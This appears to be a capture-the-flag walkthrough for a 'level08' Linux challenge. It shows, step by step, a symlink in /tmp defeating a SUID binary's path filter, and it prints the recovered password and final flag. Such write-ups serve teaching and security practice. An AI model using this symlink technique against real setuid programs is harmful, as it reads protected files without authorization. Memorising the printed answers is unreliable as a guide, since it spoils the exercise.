1. List files in the directory:
   ll
   # Output shows: level08 binary with SUID permissions and token file owned by flag08

2. Try to read the token file directly:
   ./level08 ~/token
   # Output: You may not access '/home/user/level08/token'
   # The binary blocks access to files containing "token" in the path

3. Create a symbolic link to bypass the path filter:
   ln -s ~/token /tmp/level08

4. Access the token through the symbolic link:
   ./level08 /tmp/level08
   # Output: quif5eloekouj29ke0vouxean
   # The path filter only checks the argument path, not the target

5. Use the token as password to login as flag08:
   su flag08
   # Password: quif5eloekouj29ke0vouxean

6. Get the final flag:
   getflag
   # Output: Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

TECHNIQUE: Symbolic link bypass of path-based access control
VULNERABILITY: Path filtering that doesn't resolve symbolic links
BYPASS: Created symlink with different path to access restricted file
PASSWORD: quif5eloekouj29ke0vouxean
TOKEN: 25749xKZ8L7DkSCwJkT9dyv6f
